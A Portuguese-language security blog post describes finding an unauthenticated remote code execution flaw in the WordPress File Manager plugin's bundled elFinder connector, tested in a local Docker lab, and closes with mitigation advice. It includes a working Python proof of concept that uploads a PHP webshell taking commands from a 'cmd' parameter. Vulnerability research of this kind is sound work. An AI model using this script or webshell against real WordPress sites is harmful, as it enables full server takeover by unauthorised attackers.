---
layout: post-pt
title: Unauth RCE no Wordpress File Manager
permalink: /web/urce-wp-file-manager
---

**Atenção**: A técnica demonstrada neste artigo tem o propósito de ser um material educativo, a exploração foi feita em um ambiente controlado. Não realize esta exploração sem a autorização do dono do servidor, pois isto poderá resultar em um crime!

![](/imgs/urce-wp-file-manager/plugin_store.png)

Bom, pra quem ainda não conhece o [Wordpress File Manager](https://br.wordpress.org/plugins/wp-file-manager/) é um plugin do Wordpress que simula a interface de um gerenciador de arquivos, é bem prático.

Usei o docker compose para configurar um ambiente controlado de testes, seguindo o [tutorial oficial](https://docs.docker.com/compose/wordpress/).

![](/imgs/urce-wp-file-manager/docker_compose_config.png)

Também instalei o plugin através da loja do próprio Wordpress.

![](/imgs/urce-wp-file-manager/plugin_wp_file_manager.png)

Vale observar que este plugin tem mais de **700 mil instalações ativas**.

![](/imgs/urce-wp-file-manager/plugin_wp_file_manager_ok.png)

Com o ambiente pronto para os testes, tentei encontrar algum vazamento de informação sensível que talvez fosse causada devido a configuração do container ou do plugin.

Fiz uma wordlist com os arquivos do meu interesse, que poderiam ser acessíveis através do servidor Apache.

![](/imgs/urce-wp-file-manager/leak_check.png)

![](/imgs/urce-wp-file-manager/leak_file_content.png)

Com a wordlist pronta, usei o fuzzer do zaproxy para enviar vários "GET" nos arquivos estando desautenticado.

![](/imgs/urce-wp-file-manager/fuzz_example.png)

Normalmente para aumentar a velocidade do fuzzing, eu reduzo o delay e aumento a quantidade threads.

![](/imgs/urce-wp-file-manager/fuzz_tunning.png)

![](/imgs/urce-wp-file-manager/fuzz_result.png)

Foi relativamente rápido, e obtive 979 resultados para analisar.

Então tive a ideia de filtrar os resultados, analisar possíveis vazamentos em conjuntos menores é mais fácil.

![](/imgs/urce-wp-file-manager/cmd_responses.png)

Sei que pesquisar "cmd" é algo muito genérico, mas consegui um subconjunto bem reduzido para analisar manualmente, apenas 63 respostas.

![](/imgs/urce-wp-file-manager/possible_rce.png)

Quando vi a mensagem de erro na resposta até achei que tinha encontrado uma backdoor :expressionless:, então resolvi pesquisar mais sobre o que esse arquivo faz.

![](/imgs/urce-wp-file-manager/google_elfinder.png)

De cara percebi que não tem um bom histórico.

![](/imgs/urce-wp-file-manager/previus_vulnerability.png)

![](/imgs/urce-wp-file-manager/exploit_poc_previus.png)

![](/imgs/urce-wp-file-manager/elFinder.png)

Já foi [reportado](https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/) uma vulnerabilidade que resulta em RCE no [elFinder](https://github.com/Studio-42/elFinder), então foquei em validar se essa RCE ainda acontece.

{% highlight python %}
#!/usr/bin/env python3

import requests

print('[+] tentando fazer upload da webshell')

base_uri = "http://localhost:8000"
webshell_name = "b4ckd00r.php"

requests.post(
    url=f"{base_uri}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",

    files = {
    	'upload[]': (webshell_name, '<?php system($_GET["cmd"]) ?>')
    },

    data = {
    	"cmd" : "upload",
    	"target" : "l1_Lw"
    }
)

print(f'[+] teste sua backdoor: {base_uri}/wp-content/plugins/wp-file-manager/lib/files/{webshell_name}')

{% endhighlight %}

E tive uma surpresa, é permitido o upload de arquivos arbitrários no servidor.

![](/imgs/urce-wp-file-manager/file_upload_clear.png)

![](/imgs/urce-wp-file-manager/backdoor_upload_exec.png)

![](/imgs/urce-wp-file-manager/file_upload_not_clear.png)

Confirmando que consigo realizar o upload de uma webshell, testei se realmente ocorre a interpretação do arquivo PHP ou se há alguma proteção para ser bypassada.

![](/imgs/urce-wp-file-manager/RCE.png)

A webshell "b4ckd00r.php" foi interpretada com sucesso pelo servidor e *voilà*!, **Unauth RCE** :smirk:.

## Mitigação

Uma possível forma de reduzir o impacto dessa vulnerabilidade enquanto não há um patch disponibilizado pelo fornecedor seria mantendo o PHP atualizado e desabilitar as funções críticas, por exemplo: system, exec, shell_exec.

Recomendo seguir a [PHP Configuration Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html) da OWASP.
